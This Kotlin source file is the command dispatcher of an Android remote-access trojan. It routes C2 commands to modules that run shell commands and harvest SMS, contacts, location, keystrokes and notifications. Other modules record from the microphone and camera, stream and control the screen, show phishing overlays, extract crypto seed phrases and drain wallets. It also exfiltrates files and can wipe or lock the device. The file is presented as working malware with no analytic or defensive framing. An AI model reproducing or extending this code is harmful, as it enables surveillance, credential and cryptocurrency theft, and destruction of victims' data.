// ============================================================
// FILE: android/app/src/main/java/com/xrc/svc/CommandProcessor.kt
// ============================================================
package com.xrc.svc

import android.content.Context
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.di.ServiceLocator
import com.xrc.core.net.NetworkUtils
import kotlinx.coroutines.*

/**
 * CommandProcessor — dispatches C2 commands to the appropriate module.
 *
 * Routes commands by action name:
 *   sensor:* → Sensor modules
 *   shell:* → Shell execution
 *   vnc:* → VNC / Screen streaming
 *   syringe:* → Overlay/Syringe engine
 *   crypto:* → Wallet scanner / drain
 *   file:* → File operations
 *   system:* → System controls (lock, wipe, etc.)
 *   admin:* → Device admin operations
 */
class CommandProcessor(
    private val context: Context,
    private val serviceLocator: ServiceLocator
) {
    companion object {
        private const val TAG = "CmdProcessor"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Process an incoming C2 message.
     */
    fun process(message: Message) {
        scope.launch {
            try {
                when (message.type) {
                    Protocol.TYPE_CMD -> handleCommand(message)
                    Protocol.TYPE_HEARTBEAT -> handleHeartbeat(message)
                    else -> Log.d(TAG, "Unknown message type: ${message.type}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command processing failed: ${e.message}")
            }
        }
    }

    private suspend fun handleCommand(message: Message) {
        val cmd = Protocol.json.decodeFromString<com.xrc.comms.CommandMessage>(message.payload)
        Log.i(TAG, "Command: ${cmd.action} id=${cmd.id}")

        val channelClient = serviceLocator.channelClient
        val deviceId = com.xrc.core.crypto.Identity.getDeviceId(context)

        when {
            cmd.action.startsWith("shell:") -> handleShell(cmd, channelClient, deviceId)
            cmd.action.startsWith("sensor:") -> handleSensor(cmd, channelClient, deviceId)
            cmd.action.startsWith("vnc:") -> handleVNC(cmd, channelClient, deviceId)
            cmd.action.startsWith("syringe:") -> handleSyringe(cmd, channelClient, deviceId)
            cmd.action.startsWith("crypto:") -> handleCrypto(cmd, channelClient, deviceId)
            cmd.action.startsWith("file:") -> handleFile(cmd, channelClient, deviceId)
            cmd.action.startsWith("system:") -> handleSystem(cmd, channelClient, deviceId)
            cmd.action.startsWith("admin:") -> handleAdmin(cmd, channelClient, deviceId)
            cmd.action.startsWith("notify:") -> handleNotification(cmd, channelClient, deviceId)
            cmd.action == "ping" -> sendAck(cmd.id, channelClient, deviceId)
            cmd.action == "exec" -> handleExec(cmd, channelClient, deviceId)
            else -> Log.w(TAG, "Unknown action: ${cmd.action}")
        }
    }

    private suspend fun handleShell(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val command = cmd.payload
        val result = com.xrc.utils.ShellUtils.execute(command)
        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf(
                    "stdout" to (result.first ?: ""),
                    "stderr" to (result.second ?: ""),
                    "success" to (result.first != null)
                )
            )
        )
        channel.send(resultMsg)
    }

    private suspend fun handleSensor(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("sensor:")
        val result = mutableMapOf<String, Any>()

        try {
            when (action) {
                "sms" -> {
                    val sms = serviceLocator.smsReader.readInbox()
                    result["data"] = sms
                    result["count"] = (sms as? List<*>)?.size ?: 0
                }
                "contacts" -> {
                    val contacts = serviceLocator.contactsReader.getAll()
                    result["data"] = contacts
                    result["count"] = (contacts as? List<*>)?.size ?: 0
                }
                "call_log" -> {
                    val callLog = serviceLocator.callLogger.getCallLog()
                    result["data"] = callLog
                }
                "location" -> {
                    val location = serviceLocator.locationTracker.getLocation()
                    result["lat"] = location?.first ?: 0.0
                    result["lon"] = location?.second ?: 0.0
                }
                "clipboard" -> {
                    val clipboard = serviceLocator.clipboardMonitor.getCurrent()
                    result["data"] = clipboard
                }
                "keylog" -> {
                    val keys = serviceLocator.keylogger.getBuffer()
                    result["data"] = keys
                    serviceLocator.keylogger.clearBuffer()
                }
                "notifications" -> {
                    val notifs = serviceLocator.notificationInterceptor.getCaptured()
                    result["data"] = notifs
                }
                "mic_start" -> {
                    serviceLocator.micCapture.startCapture(cmd.payload.toIntOrNull() ?: 30)
                    result["status"] = "started"
                }
                "mic_stop" -> {
                    val audio = serviceLocator.micCapture.stopCapture()
                    result["status"] = if (audio != null) "captured" else "stopped"
                    result["file"] = audio
                }
                "camera_capture" -> {
                    val camera = serviceLocator.cameraCapture.captureStill()
                    result["status"] = if (camera != null) "captured" else "failed"
                    result["file"] = camera
                }
                "camera_stream" -> {
                    serviceLocator.cameraCapture.startStreaming(
                        onFrame = { frameData ->
                            val frameMsg = Message(
                                type = Protocol.TYPE_SENSOR_DATA,
                                id = "cam_${System.currentTimeMillis()}",
                                device_id = deviceId,
                                payload = Protocol.json.encodeToString(
                                    mapOf("type" to "camera_frame", "data" to frameData)
                                )
                            )
                            channel.send(frameMsg)
                        }
                    )
                    result["status"] = "streaming"
                }
                "camera_stop" -> {
                    serviceLocator.cameraCapture.stopStreaming()
                    result["status"] = "stopped"
                }
                "device_info" -> {
                    result["model"] = android.os.Build.MODEL
                    result["manufacturer"] = android.os.Build.MANUFACTURER
                    result["android_version"] = android.os.Build.VERSION.RELEASE
                    result["sdk"] = android.os.Build.VERSION.SDK_INT
                    result["battery"] = getBatteryLevel()
                    result["network"] = NetworkUtils.getNetworkType(context).name
                }
                "installed_apps" -> {
                    val apps = getInstalledApps()
                    result["data"] = apps
                    result["count"] = apps.size
                }
                "accounts" -> {
                    val accounts = getAccounts()
                    result["data"] = accounts
                }
                "wifi_networks" -> {
                    val wifi = getWifiNetworks()
                    result["data"] = wifi
                }
                "bluetooth_devices" -> {
                    val bt = getBluetoothDevices()
                    result["data"] = bt
                }
                "running_processes" -> {
                    val processes = getRunningProcesses()
                    result["data"] = processes
                }
                else -> {
                    result["error"] = "Unknown sensor: $action"
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Sensor $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_SENSOR_DATA,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleVNC(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("vnc:")
        val result = mutableMapOf<String, Any>()

        try {
            when (action) {
                "start" -> {
                    val quality = cmd.payload.toIntOrNull() ?: 70
                    serviceLocator.vncController.startScreenCapture(quality)
                    result["status"] = "started"
                }
                "stop" -> {
                    serviceLocator.vncController.stopScreenCapture()
                    result["status"] = "stopped"
                }
                "frame" -> {
                    val frame = serviceLocator.vncController.getCurrentFrame()
                    result["data"] = frame
                    result["format"] = "jpeg_base64"
                }
                "tap" -> {
                    val parts = cmd.payload.split(",")
                    if (parts.size >= 2) {
                        val x = parts[0].toIntOrNull() ?: 0
                        val y = parts[1].toIntOrNull() ?: 0
                        serviceLocator.inputInjector.tap(x, y)
                        result["status"] = "ok"
                    }
                }
                "swipe" -> {
                    val parts = cmd.payload.split(",")
                    if (parts.size >= 4) {
                        val x1 = parts[0].toIntOrNull() ?: 0
                        val y1 = parts[1].toIntOrNull() ?: 0
                        val x2 = parts[2].toIntOrNull() ?: 0
                        val y2 = parts[3].toIntOrNull() ?: 0
                        val duration = parts.getOrNull(4)?.toLongOrNull() ?: 100L
                        serviceLocator.inputInjector.swipe(x1, y1, x2, y2, duration)
                        result["status"] = "ok"
                    }
                }
                "key" -> {
                    serviceLocator.inputInjector.keyEvent(cmd.payload)
                    result["status"] = "ok"
                }
                "text" -> {
                    serviceLocator.inputInjector.inputText(cmd.payload)
                    result["status"] = "ok"
                }
                "stream" -> {
                    serviceLocator.vncController.startStreaming { frameData ->
                        val frameMsg = Message(
                            type = Protocol.TYPE_SENSOR_DATA,
                            id = "vnc_${System.currentTimeMillis()}",
                            device_id = deviceId,
                            payload = Protocol.json.encodeToString(
                                mapOf("type" to "vnc_frame", "data" to frameData)
                            )
                        )
                        channel.send(frameMsg)
                    }
                    result["status"] = "streaming"
                }
                else -> result["error"] = "Unknown VNC action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "VNC $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleSyringe(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("syringe:")
        val result = mutableMapOf<String, Any>()

        try {
            when (action) {
                "inject" -> {
                    val target = cmd.payload
                    serviceLocator.syringeEngine.injectOverlay(target)
                    result["status"] = "injected"
                    result["target"] = target
                }
                "hide" -> {
                    serviceLocator.syringeEngine.hideAll()
                    result["status"] = "hidden"
                }
                "phish" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        val target = parts[0]
                        val template = parts[1]
                        serviceLocator.syringeEngine.showPhishingPage(target, template)
                        result["status"] = "phishing"
                    } else {
                        result["error"] = "Format: target|template"
                    }
                }
                "dismiss" -> {
                    serviceLocator.syringeEngine.dismissCurrent()
                    result["status"] = "dismissed"
                }
                "input_capture" -> {
                    val timeout = cmd.payload.toLongOrNull() ?: 30000L
                    val captured = serviceLocator.syringeEngine.captureInput(timeout)
                    result["data"] = captured
                }
                "status" -> {
                    result["active"] = serviceLocator.syringeEngine.isActive()
                    result["current_overlay"] = serviceLocator.syringeEngine.getCurrentOverlay()
                }
                else -> result["error"] = "Unknown syringe action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Syringe $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleCrypto(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("crypto:")
        val result = mutableMapOf<String, Any>()

        try {
            when (action) {
                "scan_wallets" -> {
                    val wallets = serviceLocator.walletScanner.scanAll()
                    result["wallets"] = wallets
                    result["count"] = (wallets as? List<*>)?.size ?: 0
                }
                "extract_seeds" -> {
                    val seeds = serviceLocator.seedPhraseExtractor.scanAll()
                    result["seeds"] = seeds
                    result["count"] = (seeds as? List<*>)?.size ?: 0
                }
                "drain" -> {
                    val walletAddress = cmd.payload
                    val drained = serviceLocator.walletDrain.drainWallet(walletAddress)
                    result["status"] = if (drained) "drained" else "failed"
                    result["target"] = walletAddress
                }
                "drain_all" -> {
                    val results = serviceLocator.walletDrain.drainAll()
                    result["results"] = results
                    result["count"] = (results as? List<*>)?.size ?: 0
                }
                "transaction_check" -> {
                    val txns = serviceLocator.transactionInterceptor.checkPending()
                    result["txns"] = txns
                    result["count"] = (txns as? List<*>)?.size ?: 0
                }
                "intercept_txns" -> {
                    serviceLocator.transactionInterceptor.startInterception()
                    result["status"] = "intercepting"
                }
                "wallet_balance" -> {
                    val balances = serviceLocator.walletScanner.getBalances()
                    result["balances"] = balances
                }
                "seed_scan_deep" -> {
                    val deepSeeds = serviceLocator.seedPhraseExtractor.deepScan()
                    result["seeds"] = deepSeeds
                    result["count"] = (deepSeeds as? List<*>)?.size ?: 0
                }
                else -> result["error"] = "Unknown crypto action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Crypto $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleFile(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("file:")
        val result = mutableMapOf<String, Any>()

        try {
            when (action) {
                "list" -> {
                    val path = cmd.payload.ifEmpty { "/storage/emulated/0" }
                    val files = serviceLocator.fileExplorer.listFiles(path)
                    result["files"] = files
                    result["path"] = path
                }
                "read" -> {
                    val content = serviceLocator.fileExplorer.readFile(cmd.payload)
                    result["content"] = content
                    result["path"] = cmd.payload
                }
                "write" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        serviceLocator.fileExplorer.writeFile(parts[0], parts[1])
                        result["status"] = "written"
                    }
                }
                "delete" -> {
                    serviceLocator.fileExplorer.deleteFile(cmd.payload)
                    result["status"] = "deleted"
                }
                "upload" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        serviceLocator.exfilManager.uploadFile(parts[0], parts[1])
                        result["status"] = "uploading"
                    }
                }
                "exfil" -> {
                    val path = cmd.payload
                    serviceLocator.exfilManager.exfiltrate(path)
                    result["status"] = "exfiltrating"
                }
                "exfil_batch" -> {
                    val paths = cmd.payload.split(",")
                    serviceLocator.exfilManager.exfiltrateBatch(paths)
                    result["count"] = paths.size
                    result["status"] = "queued"
                }
                "search" -> {
                    val query = cmd.payload
                    val matches = serviceLocator.fileExplorer.searchFiles(query)
                    result["matches"] = matches
                    result["count"] = (matches as? List<*>)?.size ?: 0
                }
                else -> result["error"] = "Unknown file action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "File $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleSystem(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("system:")
        val result = mutableMapOf<String, Any>()

        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager

            when (action) {
                "lock" -> {
                    if (serviceLocator.deviceAdminReceiver.isAdminActive()) {
                        serviceLocator.deviceAdminReceiver.lockScreen()
                        result["status"] = "locked"
                    } else {
                        result["error"] = "No admin privilege"
                    }
                }
                "wipe" -> {
                    if (serviceLocator.deviceAdminReceiver.isAdminActive()) {
                        serviceLocator.deviceAdminReceiver.wipeDevice()
                        result["status"] = "wiping"
                    } else {
                        result["error"] = "No admin privilege"
                    }
                }
                "reboot" -> {
                    ShellUtils.execute("su -c reboot")
                    result["status"] = "rebooting"
                }
                "shutdown" -> {
                    ShellUtils.execute("su -c shutdown")
                    result["status"] = "shutting down"
                }
                "sleep" -> {
                    pm.goToSleep(System.currentTimeMillis())
                    result["status"] = "sleeping"
                }
                "set_screen_timeout" -> {
                    val timeout = cmd.payload.toLongOrNull() ?: 30000L
                    android.provider.Settings.System.putInt(
                        context.contentResolver,
                        android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                        timeout.toInt()
                    )
                    result["status"] = "timeout_set"
                }
                "set_brightness" -> {
                    val brightness = cmd.payload.toIntOrNull() ?: 128
                    android.provider.Settings.System.putInt(
                        context.contentResolver,
                        android.provider.Settings.System.SCREEN_BRIGHTNESS,
                        brightness.coerceIn(0, 255)
                    )
                    result["status"] = "brightness_set"
                }
                "open_url" -> {
                    val url = cmd.payload
                    val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url))
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                    result["status"] = "opened"
                }
                "open_app" -> {
                    val pkg = cmd.payload
                    val intent = context.packageManager.getLaunchIntentForPackage(pkg)
                    if (intent != null) {
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(intent)
                        result["status"] = "opened"
                    } else {
                        result["error"] = "App not found"
                    }
                }
                "install_apk" -> {
                    val path = cmd.payload
                    val intent = android.content.Intent(android.content.Intent.ACTION_VIEW)
                    intent.setDataAndType(
                        androidx.core.content.FileProvider.getUriForFile(
                            context, "${context.packageName}.fileprovider",
                            java.io.File(path)
                        ),
                        "application/vnd.android.package-archive"
                    )
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    intent.addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
                    context.startActivity(intent)
                    result["status"] = "install_launched"
                }
                "uninstall_pkg" -> {
                    val intent = android.content.Intent(
                        android.content.Intent.ACTION_DELETE,
                        android.net.Uri.parse("package:${cmd.payload}")
                    )
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                    result["status"] = "uninstall_launched"
                }
                "alarm" -> {
                    val parts = cmd.payload.split("|", limit = 2)
                    if (parts.size >= 2) {
                        val delayMs = parts[0].toLongOrNull() ?: 10000L
                        val actionType = parts[1]
                        val triggerTime = System.currentTimeMillis() + delayMs
                        if (android.os.Build.VERSION.SDK_INT >= 31) {
                            alarmManager.setExactAndAllowWhileIdle(
                                android.app.AlarmManager.RTC_WAKEUP,
                                triggerTime,
                                null
                            )
                        } else {
                            alarmManager.setExact(
                                android.app.AlarmManager.RTC_WAKEUP,
                                triggerTime,
                                null
                            )
                        }
                        result["status"] = "alarm_set"
                        result["delay_ms"] = delayMs
                    }
                }
                else -> result["error"] = "Unknown system action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "System $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleAdmin(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("admin:")
        val result = mutableMapOf<String, Any>()

        try {
            val dar = serviceLocator.deviceAdminReceiver

            when (action) {
                "is_active" -> {
                    result["active"] = dar.isAdminActive()
                }
                "activate" -> {
                    dar.activateAdmin(context)
                    result["status"] = "activation_intent_sent"
                }
                "deactivate" -> {
                    dar.deactivateAdmin()
                    result["status"] = "deactivated"
                }
                "disable_camera" -> {
                    dar.setCameraDisabled(true)
                    result["status"] = "camera_disabled"
                }
                "enable_camera" -> {
                    dar.setCameraDisabled(false)
                    result["status"] = "camera_enabled"
                }
                "lock" -> {
                    dar.lockScreen()
                    result["status"] = "locked"
                }
                "wipe" -> {
                    dar.wipeDevice()
                    result["status"] = "wiping"
                }
                "set_password" -> {
                    dar.setPassword(cmd.payload)
                    result["status"] = "password_set"
                }
                "reset_password" -> {
                    dar.resetPassword()
                    result["status"] = "password_reset"
                }
                "set_lock_screen" -> {
                    dar.setLockScreenPassword(cmd.payload)
                    result["status"] = "lock_screen_set"
                }
                "disable_keyguard" -> {
                    dar.disableKeyguardFeatures()
                    result["status"] = "keyguard_features_disabled"
                }
                "freeze_device" -> {
                    dar.freezeDevice()
                    result["status"] = "frozen"
                }
                "policy_status" -> {
                    result["policies"] = dar.getActivePolicies()
                }
                else -> result["error"] = "Unknown admin action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Admin $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleNotification(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val action = cmd.action.removePrefix("notify:")
        val result = mutableMapOf<String, Any>()

        try {
            when (action) {
                "send" -> {
                    val parts = cmd.payload.split("|", limit = 3)
                    if (parts.size >= 2) {
                        val title = parts[0]
                        val body = parts.getOrElse(1) { "" }
                        val priority = parts.getOrNull(2)?.toIntOrNull() ?: 0
                        serviceLocator.notificationSender.send(title, body, priority)
                        result["status"] = "sent"
                    }
                }
                "intercept" -> {
                    serviceLocator.notificationInterceptor.startCapture()
                    result["status"] = "intercepting"
                }
                "stop_intercept" -> {
                    serviceLocator.notificationInterceptor.stopCapture()
                    result["status"] = "stopped"
                }
                "get_captured" -> {
                    val captured = serviceLocator.notificationInterceptor.getCaptured()
                    result["data"] = captured
                }
                "clear_captured" -> {
                    serviceLocator.notificationInterceptor.clearCaptured()
                    result["status"] = "cleared"
                }
                else -> result["error"] = "Unknown notify action"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Notify $action failed: ${e.message}")
            result["error"] = e.message
        }

        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(result)
        )
        channel.send(resultMsg)
    }

    private suspend fun handleExec(cmd: com.xrc.comms.CommandMessage, channel: ChannelClient, deviceId: String) {
        val resultMsg = Message(
            type = Protocol.TYPE_CMD_RESULT,
            id = cmd.id,
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf("note" to "Use shell: prefix for shell commands")
            )
        )
        channel.send(resultMsg)
    }

    private suspend fun sendAck(commandId: String, channel: ChannelClient, deviceId: String) {
        val ackMsg = Message(
            type = Protocol.TYPE_ACK,
            id = "ack_${commandId}",
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf("command_id" to commandId, "ts" to System.currentTimeMillis())
            )
        )
        channel.send(ackMsg)
    }

    private suspend fun handleHeartbeat(message: Message) {
        val channelClient = serviceLocator.channelClient
        val deviceId = com.xrc.core.crypto.Identity.getDeviceId(context)
        val ack = Message(
            type = Protocol.TYPE_HEARTBEAT,
            id = "hb_ack_${System.currentTimeMillis()}",
            device_id = deviceId,
            payload = message.payload
        )
        channelClient.send(ack)
    }

    // ---- Helper methods ----

    private fun getBatteryLevel(): Int {
        return try {
            val intent = context.registerReceiver(null,
                android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            if (intent != null) {
                val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
                val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
                if (level >= 0 && scale > 0) (level * 100) / scale else 0
            } else 0
        } catch (e: Exception) { 0 }
    }

    private fun getInstalledApps(): List<Map<String, Any>> {
        val pm = context.packageManager
        val apps = mutableListOf<Map<String, Any>>()
        val intent = android.content.Intent(android.content.Intent.ACTION_MAIN, null)
        intent.addCategory(android.content.Intent.CATEGORY_LAUNCHER)
        val resolveInfoList = pm.queryIntentActivities(intent, 0)
        for (ri in resolveInfoList) {
            apps.add(mapOf(
                "name" to ri.loadLabel(pm).toString(),
                "package" to ri.activityInfo.packageName
            ))
        }
        return apps
    }

    private fun getAccounts(): List<Map<String, Any>> {
        val accounts = mutableListOf<Map<String, Any>>()
        try {
            if (android.os.Build.VERSION.SDK_INT >= 23) {
                if (context.checkSelfPermission(android.Manifest.permission.GET_ACCOUNTS)
                    == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    val accountManager = android.accounts.AccountManager.get(context)
                    for (account in accountManager.accounts) {
                        accounts.add(mapOf(
                            "name" to (account.name?.take(3) + "***"),
                            "type" to account.type
                        ))
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Accounts failed: ${e.message}")
        }
        return accounts
    }

    private fun getWifiNetworks(): List<Map<String, Any>> {
        val networks = mutableListOf<Map<String, Any>>()
        try {
            if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                val results = wifiManager.scanResults
                for (result in results) {
                    networks.add(mapOf(
                        "ssid" to result.SSID,
                        "bssid" to result.BSSID,
                        "level" to result.level
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "WiFi scan failed: ${e.message}")
        }
        return networks
    }

    private fun getBluetoothDevices(): List<Map<String, Any>> {
        val devices = mutableListOf<Map<String, Any>>()
        try {
            val btAdapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
            if (btAdapter != null && btAdapter.isEnabled) {
                val bonded = btAdapter.bondedDevices
                for (device in bonded) {
                    devices.add(mapOf(
                        "name" to (device.name ?: "Unknown"),
                        "address" to device.address
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "BT scan failed: ${e.message}")
        }
        return devices
    }

    private fun getRunningProcesses(): List<Map<String, Any>> {
        val processes = mutableListOf<Map<String, Any>>()
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningApps = am.runningAppProcesses
            if (runningApps != null) {
                for (app in runningApps) {
                    processes.add(mapOf(
                        "pid" to app.pid,
                        "process_name" to app.processName,
                        "importance" to app.importance
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Running processes failed: ${e.message}")
        }
        return processes
    }

    fun shutdown() {
        scope.cancel()
    }
}
